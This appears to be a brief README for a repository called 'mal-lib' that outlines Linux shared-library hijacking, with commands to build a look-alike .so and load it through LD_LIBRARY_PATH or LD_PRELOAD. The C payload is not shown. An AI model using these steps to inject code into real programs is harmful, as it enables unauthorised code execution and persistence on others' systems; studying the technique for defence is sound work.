# mal-lib
LD_hijacking and if you want to add a directory /path/to/malicious/lib to the search path, or place mal.so in the folder where the program searches for libraries.
```
> ldd /path/to/program
> gcc -fPIC -shared -o {libRealName}.so ld_hijack.c
> export LD_LIBRARY_PATH=/path/to/malicious/lib:$LD_LIBRARY_PATH
> # run /path/to/program
```
```
> gcc -shared -fPIC -o libmalicious.so {name}.c
> LD_PRELOAD=./libmalicious.so ls
```
